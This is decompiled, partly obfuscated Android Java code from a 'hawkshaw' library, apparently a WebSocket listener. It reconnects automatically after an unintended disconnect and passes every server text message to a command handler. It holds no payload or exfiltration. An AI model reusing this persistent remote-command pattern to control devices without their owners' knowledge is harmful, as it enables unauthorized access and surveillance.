package com.hawkshaw.library.datalayer.network.socket;

import X1.C;
import X1.D;
import X1.E;
import X1.H;
import X1.K;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;

public final class SocketService$listener$1 extends D {
    final /* synthetic */ SocketService this$0;

    public SocketService$listener$1(SocketService socketService) {
        this.this$0 = socketService;
    }

    public void onDisconnected(C c5, H h5, H h6, boolean z4) {
        K k5;
        Logger logger = Logger.INSTANCE;
        Logger.v$default(logger, "SocketService", "OnDisconnected: " + z4, false, 4, (Object) null);
        if (!z4) {
            C access$getSocket$p = this.this$0.socket;
            synchronized (access$getSocket$p.f2435c) {
                k5 = (K) access$getSocket$p.f2435c.f9511E;
            }
            if (k5 != K.f2473E) {
                SocketService socketService = this.this$0;
                socketService.connect(socketService.socket.h(), 5000);
            }
        }
    }

    public void onError(C c5, E e5) {
        Logger.v$default(Logger.INSTANCE, "SocketService", C0528x.h("OnError: ", e5 != null ? e5.getMessage() : null), false, 4, (Object) null);
    }

    public void onTextMessage(C c5, String str) {
        if (str != null) {
            SocketCommandResolverKt.handleSocketCommand(str);
        }
    }

    public void onUnexpectedError(C c5, E e5) {
        Logger.v$default(Logger.INSTANCE, "SocketService", C0528x.h("OnUnexpectedError: ", e5 != null ? e5.getMessage() : null), false, 4, (Object) null);
    }
}
